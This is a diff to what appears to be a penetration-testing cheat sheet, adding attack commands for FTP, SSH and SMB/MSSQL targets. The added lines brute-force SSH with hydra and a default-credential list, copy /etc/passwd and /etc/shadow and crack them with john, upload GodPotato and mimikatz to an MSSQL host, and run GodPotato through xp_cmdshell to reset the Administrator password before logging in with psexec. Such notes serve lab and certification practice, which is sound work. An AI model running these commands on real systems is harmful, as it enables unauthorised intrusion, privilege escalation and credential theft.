@@ -752,6 +752,7 @@ nmap -p21 --script=<name> <IP>
 
 #bruteforce
 hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice versa
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ssh://192.168.102.240
 
 # Check for vulnerabilities associated with the identified version.
 
@@ -760,6 +761,12 @@ wget -m --no-passive ftp://anonymous:anonymous@IP
 
 #IF files like PDF are found we can run this command to inspect the metadata
 exiftool -a -u brochure.pdf
+
+#transfer files from ssh to local machine
+scp USERNAME@192.168.X.X:/etc/passwd
+scp USERNAME@192.168.X.X:/etc/shadow
+unshadow passwd shadow >hashes
+sudo john hashes --format=crypt
 
 ```
 
@@ -787,6 +794,8 @@ john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
 #bruteforce
 hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice versa
 
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ssh://192.168.102.240
+
 # Check for vulnerabilities associated with the identified version.
 ```
 
@@ -810,6 +819,12 @@ crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
 crackmapexec smb 192.168.1.100 -u username -p password --all #all information
 crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares #specific port
 crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
+crackmapexec mssql 172.16.X.X -u USER -p PASS --put-file GodPotato-NET4.exe C:\\Users\\Public\\Downloads\\GodPotato-NET4.exe #put file mssql
+xp_cmdshell C:\Users\Public\Downloads\GodPotato-NET4.exe -cmd "cmd /c net Administrator Password@123" #change password mssql
+psexec.py Administrator@172.16.X.X # login psexec
+crackmapexec mssql 172.16.X.X -u USER -p PASS --put-file mimikatz.exe C:\\Users\\Public\\Downloads\\mimikatz.exe #put file mssql
+
+
 #Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.
 
 # Smbclient
